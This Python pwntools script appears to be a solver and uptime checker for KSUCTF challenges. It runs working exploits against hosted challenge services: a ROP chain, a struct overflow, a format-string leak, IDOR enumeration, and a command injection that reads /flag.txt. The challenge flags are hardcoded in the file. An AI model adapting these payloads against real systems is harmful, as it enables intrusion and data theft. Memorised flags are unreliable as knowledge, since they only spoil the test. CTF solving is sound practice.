import requests
import time
from pwn import *
import shutup; shutup.please()

flag1 = 'KSUCTF{597f3c2d382591520b83a91c834c370d}'
flag2 = 'KSUCTF{e7b339c3192eaaf46b3c6976bb0f41c0}'
flag3 = 'KSUCTF{82171b016db3534b1ec166b6d384ff1e}'

def EZRop() -> bool:
    try:
        host = "ksuctf-ezrop.chals.io"
        context.log_level = 'error'
        elf = context.binary = ELF('./ezrop', False)
        io = remote(host, 443, ssl=True, sni=host)
        rop = ROP(elf)
        rop.raw(0x401016)
        rop.call(0x4011c7, [0x402004])
        io.sendlineafter(b': ', flat({24: rop.chain()}))
        flag = io.recvline(False).decode()
        context.log_level = 'debug'
        return flag == flag1
    except:
        return False

def Struct_Account() -> bool:
    host = "ksuctf-struct-account-t.chals.io"
    def login(p: process):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', b'spooky')
        p.sendlineafter(b'> ', b'spooky')
    context.log_level = 'error'
    elf = context.binary = ELF('./struct_user', False)
    io = remote(host, 443, ssl=True, sni=host)
    payload = flat({32: [pack(1), pack(1)]})
    login(io)
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', payload)
    login(io)
    io.sendlineafter(b'> ', b'3')
    flag = io.recvline(False).decode()
    context.log_level = 'debug'
    return flag == flag2

def Souk_Okaz() -> bool:
    host = "ksuctf-souk-service.chals.io"
    context.log_level = 'error'
    elf = context.binary = ELF('./souk_okaz', False)
    io = remote(host, 443, ssl=True, sni=host)
    io.recv()
    io.sendline(b'1')
    username = flat('', length=30, filler=b'spookysec')
    io.sendline(username)
    io.sendline(b'3')
    io.recv()
    io.sendline(b'-2358219911')
    io.recv()
    io.sendline(b'4')
    io.recv()
    io.sendline(b'%16$s')
    io.recvuntil(b'submitted: ')
    password = io.recv().splitlines()[0]
    io.sendline(b'2')
    io.recv()
    io.sendline(password)
    io.recvuntil(b'password> ')
    flag = ''
    flag += io.recv().splitlines()[0].decode()
    flag += io.recv().splitlines()[0].decode()
    context.log_level = 'debug'
    return flag == flag3

def Notes_App() -> bool:
    flag = "KSUCTF{7a071bb0319f11b6b9dc1e8f2de975d0}"
    domain = "https://ksuctf-notes-service.chals.io" # CHANGE ME
    target= domain + "/register.php"
    data = { 'user': 'test', 'email': 'test@test.test', 'pass': 'test', 'confirm_pass': 'test'}
    reg = requests.post(target, data=data)
    found = False
    with requests.Session() as session:
        target= domain + "/login.php"
        data = {'user': 'test', 'pass': 'test'}
        response = session.post(target, data=data)
        for x in range(68, 70):
            target = domain + "/index.php?id=" + str(x)
            response = session.get(target)
            if "KSUCTF{" in response.text:
                if flag in response.text:
                    found = True
                break
            time.sleep(0.1)
    return found

def Admin_Console() -> bool:
    flag = "KSUCTF{66ec1fedb2d9c95da6b74b38e2c50590}"
    domain = "https://ksuctf-adminconsole.chals.io" # CHANGE ME
    target = domain + "/challenge.php"
    payload = {"test": "crmat /flag.txt"}
    response = requests.post(target, data=payload)
    return (flag in response.text)

test_functions = [
        EZRop,
        Struct_Account,
        Souk_Okaz,
        Notes_App,
        Admin_Console
    ]

dots = [
        '   ',
        '.  ',
        '.. ',
        '...',
        ]

def green(s):
    return f'\x1b[32m{s}\x1b[0m'

def cyan(s):
    return f'\x1b[36m{s}\x1b[0m'

while 'spooky' != 'deadshell':
    for exploit in test_functions:
        try:
            success(f'{exploit.__name__}: {green("OK")}') if exploit() else warning(exploit.__name__)
        except Exception as e:
            print(e)
            continue

    # Animation because no animation = no cool
    for i in range(60 * 5): # Animate every second
        print(f'\r[{cyan("*")}] Sleeping for 5 minutes{dots[i % 4]}', end='')
        sys.stdout.flush()
        sleep(1)
    print()
